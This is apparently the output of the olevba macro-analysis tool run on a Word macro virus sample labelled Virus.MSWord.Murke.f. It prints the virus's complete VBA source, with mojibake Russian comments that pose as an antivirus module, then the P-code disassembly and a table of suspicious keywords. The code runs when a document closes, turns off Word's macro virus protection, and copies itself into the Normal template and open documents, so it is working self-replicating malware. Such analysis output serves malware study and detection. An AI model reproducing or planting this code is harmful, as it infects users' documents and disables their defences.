olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Murke.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Murke.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
'*************************************************************************
'Murka - Ýòî ñàìûé ìàëåíüêèé èç âñåõ èçâåñòíûõ ÌàêðîÀíòèâèðóñíûõ ìîäóëåé!
'Ïðèíöèï äåéñòâèÿ: Çàãðóæàåòñÿ âìåñòå ñ äîêóìåíòîì è áëîêèðóåò
'                 ðàñïðîñòðàíåíèå çàðàæåííûõ ìîäóëåé
'
'Óñëîâèÿ ðàñïðîñòðàíåíèÿ: Freeware(Ñâîáîäíî)
'Äîñòîèíñòâà:             Êîððåêòíàÿ ðàáîòà, íàäåæíîñòü!
'Íåäîñòàòêè:              Ïîêà íå íàøåë
'
'"Âñå ýòî, êîíå÷íî, õîðîøî, íî ÿ íè õðåíà íå ïîíÿë, êàê åãî
' ìîæíî ïðåîáðåñòè?!" - ãíåâíî ñêàæåøü òû. Ìîæíî!
'Äåä MustDie âàì âñå ðàñêàæåò!
'Íåîáõîäèìî ëèøü îòêðûòü äîêóìåíò íà ïåðñîíàëüíîì
'êîìïå. ãäå óæå óñòàíîâëåí àíòèâèðóñíûé ìîäóëü Murka.
'
'Àâòîðó:   mustdie@chat.ru
'Murke:    murka@chat.ru
'Äàíèëîâó: antivir@dials.ru
'*************************************************************************
On Error Resume Next
Dim s As Boolean
Dim t As Object
Dim i As Long
Dim Murka As String
  s = ActiveDocument.Saved
  Application.EnableCancelKey = wdCancelDisabled
  With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
  'ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines
  i = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  Murka = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, i)
  If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, i) <> Murka Then
    Set t = NormalTemplate.VBProject.VBComponents.Item(1)
  ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, i) <> Murka Then
    Set t = ActiveDocument.VBProject.VBComponents.Item(1)
  Else
    t = Nothing
  End If
  If TypeName(t) <> "Nothing" Then
    t.CodeModule.InsertLines 1, Murka
    Randomize
    If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Murka": .Author = "M&M": .Execute: End With
    If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
  End If
  If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Murke.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4501 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	QuoteRem 0x0000 0x0049 "*************************************************************************"
' Line #3:
' 	QuoteRem 0x0000 0x0048 "Murka - Ýòî ñàìûé ìàëåíüêèé èç âñåõ èçâåñòíûõ ÌàêðîÀíòèâèðóñíûõ ìîäóëåé!"
' Line #4:
' 	QuoteRem 0x0000 0x003D "Ïðèíöèï äåéñòâèÿ: Çàãðóæàåòñÿ âìåñòå ñ äîêóìåíòîì è áëîêèðóåò"
' Line #5:
' 	QuoteRem 0x0000 0x0033 "                 ðàñïðîñòðàíåíèå çàðàæåííûõ ìîäóëåé"
' Line #6:
' 	QuoteRem 0x0000 0x0000 ""
' Line #7:
' 	QuoteRem 0x0000 0x002B "Óñëîâèÿ ðàñïðîñòðàíåíèÿ: Freeware(Ñâîáîäíî)"
' Line #8:
' 	QuoteRem 0x0000 0x0037 "Äîñòîèíñòâà:             Êîððåêòíàÿ ðàáîòà, íàäåæíîñòü!"
' Line #9:
' 	QuoteRem 0x0000 0x0026 "Íåäîñòàòêè:              Ïîêà íå íàøåë"
' Line #10:
' 	QuoteRem 0x0000 0x0000 ""
' Line #11:
' 	QuoteRem 0x0000 0x003A ""Âñå ýòî, êîíå÷íî, õîðîøî, íî ÿ íè õðåíà íå ïîíÿë, êàê åãî"
' Line #12:
' 	QuoteRem 0x0000 0x0030 " ìîæíî ïðåîáðåñòè?!" - ãíåâíî ñêàæåøü òû. Ìîæíî!"
' Line #13:
' 	QuoteRem 0x0000 0x001D "Äåä MustDie âàì âñå ðàñêàæåò!"
' Line #14:
' 	QuoteRem 0x0000 0x0030 "Íåîáõîäèìî ëèøü îòêðûòü äîêóìåíò íà ïåðñîíàëüíîì"
' Line #15:
' 	QuoteRem 0x0000 0x0034 "êîìïå. ãäå óæå óñòàíîâëåí àíòèâèðóñíûé ìîäóëü Murka."
' Line #16:
' 	QuoteRem 0x0000 0x0000 ""
' Line #17:
' 	QuoteRem 0x0000 0x0019 "Àâòîðó:   mustdie@chat.ru"
' Line #18:
' 	QuoteRem 0x0000 0x0017 "Murke:    murka@chat.ru"
' Line #19:
' 	QuoteRem 0x0000 0x001A "Äàíèëîâó: antivir@dials.ru"
' Line #20:
' 	QuoteRem 0x0000 0x0049 "*************************************************************************"
' Line #21:
' 	OnError (Resume Next) 
' Line #22:
' 	Dim 
' 	VarDefn s (As Boolean)
' Line #23:
' 	Dim 
' 	VarDefn t (As Object)
' Line #24:
' 	Dim 
' 	VarDefn i (As Long)
' Line #25:
' 	Dim 
' 	VarDefn Murka (As String)
' Line #26:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #27:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #28:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #29:
' 	QuoteRem 0x0002 0x003E "ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines"
' Line #30:
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St i 
' Line #31:
' 	LitDI2 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Murka 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Murka 
' 	Ne 
' 	IfBlock 
' Line #33:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld Murka 
' 	Ne 
' 	ElseIfBlock 
' Line #35:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #36:
' 	ElseBlock 
' Line #37:
' 	LitNothing 
' 	St t 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld t 
' 	ArgsLd TypeName 0x0001 
' 	LitStr 0x0007 "Nothing"
' 	Ne 
' 	IfBlock 
' Line #40:
' 	LitDI2 0x0001 
' 	Ld Murka 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #41:
' 	ArgsCall Read 0x0000 
' Line #42:
' 	Ld Rnd 
' 	LitR8 0x3333 0x3333 0x3333 0x3FD3 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Murka"
' 	MemStWith Title 
' 	BoS 0x0000 
' 	LitStr 0x0003 "M&M"
' 	MemStWith Author 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' 	EndIf 
' Line #43:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #46:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

